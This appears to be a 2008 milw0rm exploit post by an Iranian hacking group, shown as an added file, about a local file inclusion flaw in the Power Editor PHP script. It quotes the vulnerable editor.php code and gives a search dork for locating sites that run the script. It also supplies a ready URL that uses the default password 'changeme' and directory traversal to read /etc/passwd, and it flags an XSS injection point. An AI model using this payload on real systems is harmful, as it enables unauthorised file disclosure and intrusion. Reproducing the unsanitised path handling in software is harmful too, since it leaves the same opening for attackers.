@@ -1,0 +1,53 @@
+	     ########################################################################
+             #                                                                      #
+             #    ..:::::Power Editor LOCAL FILE INCLUSION Vulnerbility ::::...     #           
+             ########################################################################
+
+Virangar Security Team
+
+www.virangar.net
+
+--------
+Discoverd By :Virangar Security Team (hadihadi)
+
+special tnx to:MR.nosrati,black.shadowes,MR.hesy,Zahra
+
+& all virangar members & all iranian hackerz
+
+greetz:to my best friend in the world hadi_aryaie2004
+& my lovely friend arash(imm02tal) from emperor team :)
+-----------------------------------
+download:http://www.scriptsez.net/index.php?action=details&cat=Content%20Management&id=1063623812
+dork: Powered By Power Editor
+-----------------------------------
+vuln code in editor.php:
+line 84-94:
+if ($action=="tempedit") {
+$n=base64_decode($m);    
+if ($n==$password){
+template();
+$te=$HTTP_GET_VARS['te'];
+$dir=$HTTP_GET_VARS['dir'];
+$filename = "$dir/$te";
+$fd = fopen ($filename, "r");
+$stuff = fread ($fd, filesize ($filename));
+fclose ($fd);
+?>
+-------
+vuln:
+http://site.com/editor.php?action=tempedit&m=[base64 password]&te=[local_file]&dir=[local_dir]
+examp:
+editor.php?action=tempedit&m=Y2hhbmdlbWU=&te=/etc/passwd&dir=../../../../../../../../../..
+
+-------------------------------------
+and xss here :D :
+http://site.com/editor.php?action=tempedit&m=[base64 password]&te=[xss]&dir=[xss]
+-----
+note:
+default pass for login is:changeme
+-----
+young iranian h4ck3rz
+/* tnx 2:
+st0rke,aria-security.net,r00tshell.org,all h4ck3rz */
+
+# milw0rm.com [2008-05-05]
